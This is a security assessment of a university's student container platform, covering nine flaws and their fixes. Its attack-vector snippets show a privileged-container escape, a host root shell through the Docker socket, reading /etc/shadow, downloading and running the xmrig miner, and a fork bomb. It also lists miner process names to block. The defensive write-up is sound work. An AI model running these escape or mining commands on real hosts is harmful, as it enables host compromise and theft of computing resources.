# Security Vulnerability Assessment: Hydra SAML Auth

This document outlines security vulnerabilities discovered in the Hydra student container infrastructure that could allow container breakout and unauthorized resource usage (e.g., cryptocurrency mining).

## Critical Vulnerabilities

### 1. Privileged Containers (Container Escape - CRITICAL)

**Location:** 
- `routes/containers.js:526` - `Privileged: true`
- `services/docker-containers.js:290` - `Privileged: true`

**Description:**
Docker containers in Docker mode are created with `Privileged: true` for Docker-in-Docker functionality. This grants the container full access to all devices on the host and effectively disables all container isolation.

**Attack Vector:**
```bash
# Inside a privileged container, an attacker can:
# 1. Mount the host filesystem
mkdir /tmp/host
mount /dev/sda1 /tmp/host
chroot /tmp/host

# 2. Access host namespace
nsenter --target 1 --mount --uts --ipc --net --pid bash

# 3. Load kernel modules
insmod malicious_module.ko
```

**Risk Level:** CRITICAL - Full host compromise possible

**Recommendation:**
- For K8s mode: Already uses non-privileged pods (good)
- For Docker mode: Remove privileged mode and use specific capabilities if Docker-in-Docker is required:
  ```javascript
  HostConfig: {
    CapAdd: ['SYS_ADMIN'],  // Only if absolutely necessary
    SecurityOpt: ['seccomp=default'],
    Privileged: false
  }
  ```
- Consider using Sysbox or gVisor for nested container support without privileged mode

---

### 2. Docker Socket Access (Container Escape - CRITICAL)

**Location:**
- `docker-compose.yaml:15` - `/var/run/docker.sock:/var/run/docker.sock`
- `student-container/supervisord.conf:22` - Documents socket mount intention
- Student container Dockerfiles install Docker CLI

**Description:**
The design intends to mount the Docker socket into student containers for Docker-in-Docker functionality. This is equivalent to root access on the host.

**Attack Vector:**
```bash
# From inside a container with Docker socket mounted:
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i bash
# Now you have a root shell on the host
```

**Risk Level:** CRITICAL - Full host compromise possible

**Recommendation:**
- Never mount Docker socket into untrusted containers
- Use Docker-in-Docker (dind) sidecar pattern in K8s instead
- Use rootless Docker or Podman for nested containers
- Implement socket proxy with strict filtering (e.g., docker-socket-proxy)

---

### 3. Passwordless Sudo for Student User (Privilege Escalation - HIGH)

**Location:**
- `student-container/Dockerfile:97` - `echo "student ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`
- `student-container/Dockerfile.gpu:93` - Same

**Description:**
The student user can execute any command as root without a password. Combined with privileged containers or Docker socket access, this amplifies the attack surface.

**Attack Vector:**
```bash
# Student can become root instantly
sudo su -
# Or run any privileged command
sudo cat /etc/shadow
sudo mount /dev/sda1 /mnt
```

**Risk Level:** HIGH - Local privilege escalation

**Recommendation:**
Remove passwordless sudo. If sudo is needed for specific commands:
```dockerfile
# Instead of ALL, limit to specific commands:
RUN echo "student ALL=(ALL) NOPASSWD: /usr/bin/supervisorctl, /usr/bin/apt" >> /etc/sudoers
```

Or remove sudo entirely and use proper entrypoint scripts for privileged operations.

---

## High Vulnerabilities

### 4. Supervisor Web Interface Without Authentication

**Location:**
- `student-container/supervisord.conf:18` - `port=0.0.0.0:9001`

**Description:**
The Supervisor web interface is bound to all interfaces without authentication. Anyone with network access to port 9001 can start/stop processes.

**Attack Vector:**
```bash
# From any machine that can reach the container:
curl http://container-ip:9001/index.html  # Access web UI
# Or use XML-RPC to start/stop processes
```

**Risk Level:** HIGH - Process control without authentication

**Recommendation:**
```ini
[inet_http_server]
port=127.0.0.1:9001  # Bind to localhost only
username=admin       # Add authentication
password=%(ENV_SUPERVISOR_PASSWORD)s
```

---

### 5. Mining Detection Without Enforcement

**Location:**
- `services/security-monitor.js` - Detection only, no automatic termination

**Description:**
The security monitor detects high CPU usage that could indicate mining but only logs/alerts. It does not terminate or throttle the offending process.

**Attack Vector:**
```bash
# Download and run a miner
wget https://example.com/xmrig
chmod +x xmrig
./xmrig -o pool.example.com:3333 -u wallet
# Mining continues until manually stopped by admin
```

**Risk Level:** HIGH - Resource abuse

**Recommendation:**
1. Add process blacklist enforcement in security-monitor.js
2. Implement automatic container pause/stop for sustained high CPU
3. Add process name detection for common miners (xmrig, ethminer, etc.)
4. Consider using cgroups freezer for suspected containers

Example implementation:
```javascript
// Blocklist of process names
const MINING_PROCESS_BLOCKLIST = [
  'xmrig', 'ethminer', 'minerd', 'cgminer', 'bfgminer', 
  'cpuminer', 'ccminer', 'phoenixminer', 'nbminer'
];

// In periodic stats check, also check for blocked processes
async function checkForMiningProcesses(container) {
  const exec = await container.exec({
    Cmd: ['ps', 'aux'],
    AttachStdout: true
  });
  // Parse output and check for blocklisted processes
  // If found, pause or stop container
}
```

---

### 6. K8s Pod Security Context Missing Critical Fields

**Location:**
- `services/k8s-containers.js:62-68` and `111-113`

**Description:**
The dynamically created K8s pods have weaker security context than the reference template in `k8s/components/student-pods/pod-template.yaml`. Missing:
- `runAsNonRoot: true`
- `allowPrivilegeEscalation: false`
- `capabilities.drop: ALL`

**Current Code:**
```javascript
securityContext: {
  fsGroup: 1000,
  seccompProfile: { type: 'RuntimeDefault' }
}
// Container-level:
securityContext: {
  readOnlyRootFilesystem: false  // Only this field
}
```

**Template (correct):**
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  runAsGroup: 1000
  fsGroup: 1000
  seccompProfile:
    type: RuntimeDefault
# Container-level:
securityContext:
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: false
  capabilities:
    drop: [ALL]
```

**Risk Level:** HIGH - Weaker isolation than intended

**Recommendation:**
Update `k8s-containers.js` to match the pod template security settings (fix provided below).

---

## Medium Vulnerabilities

### 7. No Network Policy Isolation

**Location:** K8s deployment configuration

**Description:**
Student pods can communicate with each other and potentially with other services in the cluster. No NetworkPolicy restrictions are applied.

**Attack Vector:**
- Students could attack other student containers
- Lateral movement within cluster
- Access to cluster services not intended for students

**Recommendation:**
Apply NetworkPolicy to restrict student pod communication:
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: student-isolation
  namespace: hydra-students
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: student-container
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: traefik
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 10.0.0.0/8      # Block internal IPs
              - 172.16.0.0/12
              - 192.168.0.0/16
```

---

### 8. No Resource Limits for Fork Bombs / Process Limits

**Location:** Container creation in Docker and K8s mode

**Description:**
No `pids-limit` (Docker) or PID limits are configured, allowing fork bomb attacks that could consume all host PIDs.

**Attack Vector:**
```bash
# Fork bomb
:(){ :|:& };:
```

**Recommendation:**
Docker:
```javascript
HostConfig: {
  PidsLimit: 256,  // Reasonable limit
  Ulimits: [
    { Name: 'nproc', Soft: 256, Hard: 512 }
  ]
}
```

K8s: Use LimitRange or PodSpec pid limits (requires K8s 1.20+)

---

### 9. Jupyter and VS Code Without Token/Password

**Location:**
- `student-container/supervisord.conf:34` - `--auth none`
- `student-container/supervisord.conf:44` - `--NotebookApp.token='' --NotebookApp.password=''`

**Description:**
Code-server and Jupyter are configured without authentication. While protected by forward auth at the Traefik level, if that fails or is bypassed, services are open.

**Risk Level:** MEDIUM - Defense in depth concern

**Recommendation:**
Enable application-level authentication as a second layer:
```ini
# code-server - use PASSWORD env var
command=/usr/bin/code-server --bind-addr 0.0.0.0:8443 /home/student

# Jupyter - use token from environment
command=/usr/local/bin/jupyter lab --ip=0.0.0.0 --port=8888 --no-browser
```

---

## Security Hardening Recommendations Summary

1. **Remove privileged mode** from Docker containers
2. **Never mount Docker socket** into student containers
3. **Remove or restrict sudo** access
4. **Add authentication** to supervisor web interface
5. **Implement process blocklist** for mining software
6. **Update K8s pod security context** to match the secure template
7. **Apply NetworkPolicy** for pod isolation
8. **Add PID limits** to prevent fork bombs
9. **Enable application-level auth** for Jupyter/VS Code as backup

---

## Files Requiring Changes

| File | Issue | Priority |
|------|-------|----------|
| `student-container/Dockerfile` | Passwordless sudo | HIGH |
| `student-container/Dockerfile.gpu` | Passwordless sudo | HIGH |
| `student-container/supervisord.conf` | Supervisor auth | HIGH |
| `services/k8s-containers.js` | Pod security context | HIGH |
| `routes/containers.js` | Privileged mode | CRITICAL |
| `services/docker-containers.js` | Privileged mode | CRITICAL |
| `services/security-monitor.js` | Mining enforcement | HIGH |

---

## Version

- Document created: 2026-02-01
- Repository: compsci-suny-newpaltz/hydra-saml-auth
